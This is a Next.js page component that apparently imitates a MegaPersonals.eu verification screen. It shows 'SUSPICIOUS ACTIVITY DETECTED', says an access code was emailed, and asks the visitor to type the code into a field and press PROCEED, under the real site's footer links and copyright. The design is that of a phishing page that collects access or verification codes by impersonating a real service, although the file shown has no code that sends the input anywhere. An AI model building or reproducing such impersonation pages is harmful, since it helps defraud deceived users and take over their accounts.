'use client';
import React, { useEffect, useState } from 'react';
import loginBenner from '@/images/loginbenner.png';
import Image from 'next/image';
import quetions from '@/images/quetions.png';
import WaringModal from '@/components/WaringModal';



const page = () => {

    const [isModalOpen, setModalOpen] = useState(true);
    const handleOkClick = () => {
        setModalOpen(false); // Close the modal
        // Optionally, you can add logic to proceed after closing the modal
    };



     


    return (
        <main className='py-[40px] w-[570px] mx-auto'>
            <WaringModal   
            isOpen={isModalOpen}
            onRequestClose={() => setModalOpen(false)}
            onOk={handleOkClick}/>
           
        <section className='flex flex-col gap-[20px]'>
        <section className='flex justify-center gap-[20px]'>
           <Image src={loginBenner} width={413} height={83} alt='login Benner'/>
           </section>
        <div className='bg-[#F8EFCE] rounded-sm text-center w-full px-[20px]'>
            <h3 className='text-[24px] text-[#B9A697] font-normal'>SUSPICIOUS ACTIVITY DETECTED</h3>
        </div>

        <div className='leading-[26px] text-center'>
            <h3 className='text-[#C76441] text-[24px] font-normal'>Your <span className='text-[24px] font-bold'>ACCESS CODE</span></h3>
            <h3 className='text-[#C76441] text-[24px] font-normal'>has been sent <span className='font-bold'>successfully</span> </h3>
            <h3 className='text-[#C76441] text-[24px] font-normal'>to your email on <span className='font-bold'>September 29,2024</span></h3>
            <h3 className='text-[#C76441] text-[24px] font-normal'>That code remains valid.</h3>
        </div>
        <div className='leading-[26px] text-center'>
            <h3 className='text-[#2FAEEA] font-bold italic text-[24px]'>CHECK YOUR SPAM</h3>
            <h3 className='text-[#2FAEEA] font-bold italic text-[24px]'>FOLDER IT MAY BE THERE.</h3>
        </div>
        <div className='flex justify-center gap-[10px]'>
            <h3 className='text-[#FF0000] text-[24px] font-bold leading-[26px] italic'>DO NOT SHARE IT</h3>
            <Image src={quetions} width={26} height={24} />
        </div>
        <h3 className='text-center text-[#C76441] text-[24px] leading-[26px] font-normal'>Enter the code <br /> below to continue.</h3>

        <div className='flex justify-center'>
        <input type="text" name="code" className='block outline-none w-[253px] h-[33px] rounded border border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Code' required/>
        </div>

        <div className='flex justify-center'>
        <button className='bg-[#F0AD4E] w-[125px] h-[44px] rounded text-[#FFFFFF] text-[20px] leading-[23px]'>PROCEED</button>
        </div>


        <div className='text-center flex flex-col sm:gap-[26px] gap:[10px] '>
          <ul className='flex sm:gap-2 gap-[1px] justify-center text-[#0481C9] sm:text-[13px] text-[8px] font-normal'>
            <a href="/"><li className='cursor-pointer'>Home</li></a>
            <li>|</li>
            <li className='cursor-pointer'>Manage Posts</li>
            <li>|</li>
            <li className='cursor-pointer'>Contact Us</li>
            <li>|</li>
            <li className='cursor-pointer'>Policies & Terms</li>
          </ul>
          <h3 className='text-[#0481C9] text-[13px]'>Copyright @2024 MegaPersonals.eu</h3>
        </div>

        </section>

        


        </main>
    );
};

export default page;